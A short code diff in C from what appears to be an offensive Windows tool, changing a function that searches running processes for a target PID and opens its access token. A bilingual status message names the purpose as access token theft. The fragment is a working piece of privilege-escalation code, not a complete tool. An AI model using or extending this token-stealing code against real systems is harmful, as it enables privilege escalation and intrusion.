@@ -184,13 +184,13 @@ void SFGetToken(DWORD pid) {
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     SFPrintStatus("Searching for the Targeted Process", "正在寻找目标进程以进行访问令牌窃取");
     while (1) {
-        HANDLE hTokenProcess = 0xcccccccccccccccc;
+        hTokenProcess = 0xcccccccccccccccc;
         OBJECT_ATTRIBUTES objectAttributes;
         CLIENT_ID clientId;
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
-        status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        status = SFNtOpenProcess(&hTokenProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
         if ((hTokenProcess != 0xcccccccccccccccc) && (hTokenProcess != 0) && (DWORD)(ULONG_PTR)processInfo->UniqueProcessId == pid) {
             hToken = 0xcccccccccccccccc;
             status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
